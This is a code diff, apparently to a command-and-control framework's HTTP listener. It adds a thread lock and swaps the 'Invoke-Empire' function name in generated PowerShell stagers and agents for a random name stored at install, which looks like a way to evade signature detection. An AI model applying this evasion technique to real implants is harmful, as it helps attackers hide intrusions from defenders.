@@ -142,6 +142,18 @@ class Listener(object):
         # set the default staging key to the controller db default
         self.options['StagingKey']['Value'] = str(helpers.get_config('staging_key')[0])
 
+        # used to protect self.http and self.mainMenu.conn during threaded listener access
+        self.lock = threading.Lock()
+
+    def get_db_connection(self):
+        """
+        Returns the cursor for SQLlite DB
+        """
+        self.lock.acquire()
+        self.mainMenu.conn.row_factory = None
+        self.lock.release()
+        return self.mainMenu.conn
+
     def default_response(self):
         """
         If there's a default response expected from the server that the client needs to ignore,
@@ -536,6 +548,16 @@ class Listener(object):
             with open("%s/data/agent/stagers/http.ps1" % (self.mainMenu.installPath)) as f:
                 stager = f.read()
 
+            # Get the random function name generated at install and patch the stager with the proper function name
+            conn = self.get_db_connection()
+            self.lock.acquire()
+            cur = conn.cursor()
+            cur.execute("SELECT Invoke_Empire FROM functions")
+            replacement = cur.fetchone()
+            cur.close()
+            self.lock.release()
+            stager = stager.replace("Invoke-Empire", replacement[0])
+
             # patch in custom headers
             if profile.stager.client.headers:
                 headers = ",".join([":".join([k.replace(":","%3A"),v.replace(":","%3A")]) for k,v in profile.stager.client.headers.items()])
@@ -643,6 +665,17 @@ class Listener(object):
             code = ""
             with open(self.mainMenu.installPath + "./data/agent/agent.ps1") as f:
                 code = f.read()
+
+            # Get the random function name generated at install and patch the stager with the proper function name
+            conn = self.get_db_connection()
+            self.lock.acquire()
+            cur = conn.cursor()
+            cur.execute("SELECT Invoke_Empire FROM functions")
+            replacement = cur.fetchone()
+            cur.close()
+            self.lock.release()
+
+            code = code.replace("Invoke-Empire", replacement[0])
 
             # path in the comms methods
             commsCode = self.generate_comms(listenerOptions=listenerOptions, language=language)
